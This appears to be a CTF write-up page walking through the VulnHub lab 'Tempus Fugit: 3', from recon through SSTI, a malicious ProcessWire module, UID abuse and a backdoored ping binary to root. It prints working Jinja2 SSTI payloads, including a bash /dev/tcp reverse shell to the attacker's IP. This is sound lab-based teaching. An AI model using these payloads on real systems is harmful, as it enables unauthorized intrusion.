@@ -1,0 +1,136 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Tempus Fugit: 3 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/tempus-fugit-3-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-10-11T13:44:38+00:00">October 11, 2020</time><time class="updated" datetime="2025-07-10T15:56:22+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “<strong>Tempus: 3</strong>“.  It’s available at VulnHub for penetration testing and you can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/tempus-fugit-3,398/">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">The merit of making this lab is due to <strong><a style="color: #000000;" href="https://twitter.com/4nqr34z">@4nqr34z</a></strong> &amp; <strong><a style="color: #000000;" href="https://twitter.com/theart42">@theart42</a></strong>. Let’s start and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">Level: <strong>Hard</strong></span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Ghidra</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SSTI (Server Site Template Injection)</span></li>
+<li><span style="color: #000000;">Dump credentials database SQLite</span></li>
+<li><span style="color: #000000;">Malicious Module Processwire (Reverse Shell)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Backups and abuse OPT Auth Google</span></li>
+<li><span style="color: #000000;">Abuse script created users with arbitrary UID</span></li>
+<li><span style="color: #000000;">Reversing binary and ping binary abuse</span></li>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Reconnaissance</span></h3>
+<p><span style="color: #000000;">We are looking for the machine with netdiscover</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover -i ethX</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2L89LXIt_p4/X4MCoiQHFxI/AAAAAAAApXU/tzGoKpW8A-kamw9AUYXiYNxzSy3utktIwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">So, we put the IP address in our “<strong>/etc/hosts</strong>” file and start by running the map of all the ports with operating system detection, software versions, scripts and traceroute.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A –p- tempusf3.vh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gdWlYT0VYCs/X4MDcQMZ91I/AAAAAAAApXc/PKm6r4gTxKUNs29_yIudmzl64fdXe4dgACLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We access the web service and start listing versions, code, users…</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ByrJZb61--w/X4MDjcosKkI/AAAAAAAApXg/6D_Yd43fGFM1M7BH9_fA5tAUDp7UBZe7ACLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">In the following image, we see <strong>3 users</strong>, and the image tells us that we are going to have fun with this machine xD.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J2sMdhtgc9w/X4MDtG_BG2I/AAAAAAAApXo/_ctfDJ7L_EY6yE3imT5IBE0BTKbuuAVlACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We listed an <strong>authentication panel</strong>, we tried brute force, but it is not possible to access it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SOajRugHaXE/X4MDzkaYZHI/AAAAAAAApXs/iQhIt6NGI4I-PZJbZ6rxXWAkXgs94qbUQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Forcing the application to show some error, we see that it writes what we pass it through the URL.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kIMJhgmKzm0/X4MD5JVN4tI/AAAAAAAApXw/SPHxZlPHXRQf_McseUHXR3xbS-cGNazcACLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">This reminded me that I might be vulnerable to <strong>SSTI</strong> (Server Side Template Injection), so let’s do a proof of concept:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vcLptja6Wck/X4MEAcwZpgI/AAAAAAAApX4/Bu1exGcs6cE5WziibfFBOAQWko_TT5uLwCLcBGAsYHQ/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">Before we will check what type of template you use, if it is “<strong>jinja2</strong>” it will show the number of times the number we multiply it, otherwise, it will multiply it giving “<strong>81</strong>“, in this case, it will be “<strong>twig</strong>“.</span></p>
+<p><span style="color: #000000;">As you can see, we are in front of a “<strong><u>jinja2</u></strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Z4-Txz5vf2s/X4MEHSSq-ZI/AAAAAAAApX8/JcYJE1cKRdE9HeZJLlk9Duu_jfqhJylnwCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Indeed, it is vulnerable. We are going to try to <strong>execute a command</strong> to check if it prints it on the screen.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jovDZOyFvkA/X4MEWxHM01I/AAAAAAAApYM/wKBc8MlqJJYNAvoC9h9CNUqS5fYopwsPwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now we will put a netcat to listen and we will execute the following command to obtain a reverse shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.10.167/4444 0&gt;&amp;1'",shell=True,stdout=-1).communicate()[0].strip()}}</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GT7rUuJT5Oc/X4MEmFaCiOI/AAAAAAAApYQ/iCrutvJOdyEQ8RxqVG9j4X5fxrl0ygRjACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">We read the file “<strong>app.py</strong>“, this file contains the “<strong>secret_key</strong>” (flag nº1) and “<strong>pragma key</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5WvSA8O4eLY/X4MEsjuByGI/AAAAAAAApYY/N5LPnWi8Q6UzGTpRTIRe5TAlUks1KHEvACLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">We decode the base64 and find the first flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LdGrNucVY-0/X4ME0KiKH-I/AAAAAAAApYc/eebnwzA380kMao8yGafKVkvflSu4KaPOACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Listing the binaries we have access to, we find “<strong>sqlcipher</strong>“, if we look for information about “<strong>pragma key</strong>“, we will find that to dummy the information, we will need the help of this tool.</span></p>
+<p><span style="color: #000000;">These will give us the <strong>three registered users</strong> on the website and another <strong>flag</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WDeU32QTcCs/X4ME9WlndnI/AAAAAAAApYk/TH2Jk8WrOHAO-hG8uURXzwD0BmubPpVNgCLcBGAsYHQ/s16000/14.png"/></span></p>
+<h5><span style="color: #000000;">We <strong>decode</strong> and get another <strong>flag</strong>.</span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g6TL_lEMVSQ/X4MFRK4Z-cI/AAAAAAAApYw/lLA0KDZ2PmkKa9LB1X5UaLOF6o_JNmr5QCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">We access the <strong>3 users</strong> with their respective passwords, we will obtain the same information.</span></p>
+<p><span style="color: #000000;">In that string in <strong>base64</strong> we will find the <strong>flag nº 2</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7dLCgY5BMQ0/X4MFWLh9hSI/AAAAAAAApY0/bLFbBRsFz6wZTe_vOCEUtmvwOiV9Am2OwCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We decode again.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CUnjgL9p5Ok/X4MFfSNXuTI/AAAAAAAApY4/yWIsCebhnRgR7uwawSu_zA7v1FWCWdHwQCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">If we look, both profiles show us the number “<strong>37303</strong>“. We do an internal <u>port scan with a python script</u> (In google there are many).</span></p>
+<p><span style="color: #000000;">Then, we list three open ports, including “<strong>37303</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1sii4kcCHZc/X4MFlvWoNfI/AAAAAAAApZE/1gh2Y9Q3eO4zE_Sbny68FtacUdXIxRm9gCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">We do a port forwarding and see that this port corresponds to an OpenSSH.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TZjMheCoEkY/X4MFsZwzsVI/AAAAAAAApZI/NCDncX25lbwNeO2C6_8-CXRJB7BFxpLGwCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kI--A6QFPIo/X4MF0HwRIpI/AAAAAAAApZQ/smJ7SmcQxOcpPcESuTD3hOav8OW066KVgCLcBGAsYHQ/s16000/20.png"/></span></p>
+<p><span style="color: #000000;">We repeat the port forwarding, this time with port <strong>443</strong>.</span></p>
+<p><span style="color: #000000;">Then, we will have access to a new website, we see that it gives us the clue that “<strong>Hugh Janus</strong>” is the <u>administrator</u>.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-x1BXV-S0_YM/X4MF-gxdGyI/AAAAAAAApZc/2-1oykgLNpM3Ao6T8uLdCuqgG9_qPgtwgCLcBGAsYHQ/s16000/21.png"/></strong></span></p>
+<p><span style="color: #000000;">We see that the user “<strong>Anita</strong>” has come up with the great idea, that users can upload files.</span></p>
+<p><span style="color: #000000;">Access to the administrator panel is also listed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F5_MgSUhJqI/X4MGFJDm-oI/AAAAAAAApZk/g---Ol0aVYUo4B5cmRuHbW_PZ5n0ExVBACLcBGAsYHQ/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">We tried to access with the user “<strong>Hugh-janus</strong>” but it gives us an error, now we try with the user “<strong>admin</strong>” and the password of “<strong>Hugh</strong>“, we will enter without problem to the panel.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wqGU-auRKOw/X4MGVQATs2I/AAAAAAAApZw/kV_W1_W3kTYGMX4K3Uvng5q3J9bcIQgpwCLcBGAsYHQ/s16000/23.png"/></span></p>
+<p><span style="color: #000000;">We found an upload to upload modules, we downloaded a proof of concept module from the official website.</span></p>
+<p><span style="color: #000000;">After unzipping, we modify the “Helloworld.module.php” file and add a reverse shell to the “else” function.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xfXgwQTgWMo/X4MGbpurEZI/AAAAAAAApZ0/yg2L-9dbmGgW6ZPNFvrXzLP3dacI9xZIACLcBGAsYHQ/s16000/24.png"/></span></p>
+<p><span style="color: #000000;">We upload the file and load it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FG8WDeb-OCk/X4MGjRzuQvI/AAAAAAAApZ4/aX6SMxtGx0Ma9Wc0kUkTqrl-5n9G72oOACLcBGAsYHQ/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">To listen to and modify any CMS page, we installed a netcat. We will be able to access the machine after checking our terminal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lyfy2kSXxAU/X4MGwa8VyrI/AAAAAAAApaE/WMjAC_ZaSfUMXAArZTY8Qb5_xxFO9000QCLcBGAsYHQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cqJxMW3aMPs/X4MHFEPVFQI/AAAAAAAApaM/-CPamV_r2lEPOVC9AhBoD1eLYN1hJrSggCLcBGAsYHQ/s16000/27.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation (user Myrtia)</span></h3>
+<p><span style="color: #000000;">After an exhaustive enumeration, we find an image in the “<strong>backups</strong>” folder, the name mentions one of the users of the system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hchGQz0nrFg/X4MG-IGt5zI/AAAAAAAApaI/MLaBJkt-heYr6K4LWA_5GOVTlrM9Vhl2gCLcBGAsYHQ/s16000/28.png"/></span></p>
+<p><span style="color: #000000;">This is a <strong>QR code</strong>, we read it and it will give us a temporary code to access a service.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L8e4nW2Hn10/X4MHbxakwQI/AAAAAAAApaU/pYG9qw8sNnsZuypesk3rcpCs9oeIF3_YACLcBGAsYHQ/s16000/29.png"/></span></p>
+<p><span style="color: #000000;">This reminded me of a machine I did recently, so I set up this “<strong>OUPAUTH</strong>” (possibly Google Authentication) to my cell phone and we connected via <strong>SSH</strong>.</span></p>
+<p><span style="color: #000000;">And also, we check that we can execute the “<strong>addcustomer</strong>” script with the root user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FzjK7NyEIfk/X4MHsZdp2VI/AAAAAAAApag/1HNR7k8Ia-YDrOQ46uoFWWv2iTW_SNjAwCLcBGAsYHQ/s16000/30.png"/></span></p>
+<p><span style="color: #000000;">We run the script, fill in the data and then check if it is possible to <strong>create users</strong>.</span></p>
+<p><span style="color: #000000;">The following image shows that it is.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1CLQJ0OEd5g/X4MHyuuc4KI/AAAAAAAApak/La6itVTTsjYWthdSespu1wDoLzEC5o9cQCLcBGAsYHQ/s16000/31.png"/></span></p>
+<p><span style="color: #000000;">At the moment, we don’t find it very useful, besides the script is executed from the root directory and we don’t have access to it.</span></p>
+<p><span style="color: #000000;">We continue listing the user’s home files that we have gained access to and read the <strong>4th flag</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uHpJGRwlc8Q/X4MH-Kpz81I/AAAAAAAApaw/NIk5br-4FnMNuJUb47hy3KuKEL32_s77ACLcBGAsYHQ/s16000/32.png"/> </span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation (user Cecil)</strong></span></h3>
+<p><span style="color: #000000;">We keep listing files and directories, we find a file called <strong>“…”,</strong> quite suspicious and with a different <strong>UID</strong>. We do not have access to this file…. But… What if we create a new user and assign this UID?</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--3j9rTQwGGY/X4MIH8n93UI/AAAAAAAApa4/XImYNPlShFg9TryxaNRLxVNvaLUgpj2TwCLcBGAsYHQ/s16000/33.png"/></span></p>
+<p><span style="color: #000000;">Let’s give it a try! We create a new user, we assign it <strong>suid</strong> “<strong>1337</strong>“, we check that the user has been successfully created by reading the “<strong>/etc/passwd</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Atq5Qp4IHRA/X4MIPcHb2xI/AAAAAAAApbA/nKs4MwR5w6E19pYkZmhRaKGl2qbRwT41gCLcBGAsYHQ/s16000/34.png"/></span></p>
+<p><span style="color: #000000;">Then, we authenticate with the new user, execute our two favourite commands to get an interactive shell and read the file <strong>“…”.</strong></span></p>
+<p><span style="color: #000000;">We get a<span style="text-decoration: underline;"> <strong>private key</strong></span> from <strong>OpenSSH</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h-FD-LbLTY0/X4MIhPMkUUI/AAAAAAAApbI/DNZNmHN7yQg_DUdYVHAoadjSn2tpKEofQCLcBGAsYHQ/s16000/35.png"/></span></p>
+<p><span style="color: #000000;">Now we are not clear to which user it belongs, so we will try one by one until we manage to connect with the user “<strong>cecil</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bAricLhbPSU/X4MIyk-OCJI/AAAAAAAApbQ/Fbb7c-WNXw0LKXUMBuAxDAiVxe4V7_TiACLcBGAsYHQ/s16000/36.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation (root)</span></h3>
+<p><span style="color: #000000;">According to a clue given by one of its creators, the “<strong>ping</strong>” binary had to be revised. We opened <strong>ghidra</strong> and found that the binary opens a shell if the UID and the string “<strong>deadbeef</strong>” match when executing the “<strong>ping</strong>” command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gNkfjR90uTk/X4MI8zklpAI/AAAAAAAApbU/fJ7cVhNSP2gHSFk22MrpJul5kbf0PaV0wCLcBGAsYHQ/s16000/37.png"/></span></p>
+<p><span style="color: #000000;">We already have the user equivalent to the <strong>UID</strong>, we just need to execute the command specifying “<strong>deadbeef</strong>“.</span></p>
+<p><span style="color: #000000;">Then, we execute a <strong>ping</strong>, the binary will do its checks and will give us a <strong><u>shell as root</u></strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ef1Bd8oCAJY/X4MJDWe7cbI/AAAAAAAApbc/khWLM2v0Kf4U4HhOPxrfPv53CZTOsM7wwCLcBGAsYHQ/s16000/38.png"/></span></p>
+<p><span style="color: #000000;">And finally, we will read the <strong>last flag</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v-Khw_ck6jA/X4MJJGZuFaI/AAAAAAAApbg/Yn6nJhfr4fQ3TJRzphESohI4bTfN_cAbQCLcBGAsYHQ/s16000/39.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
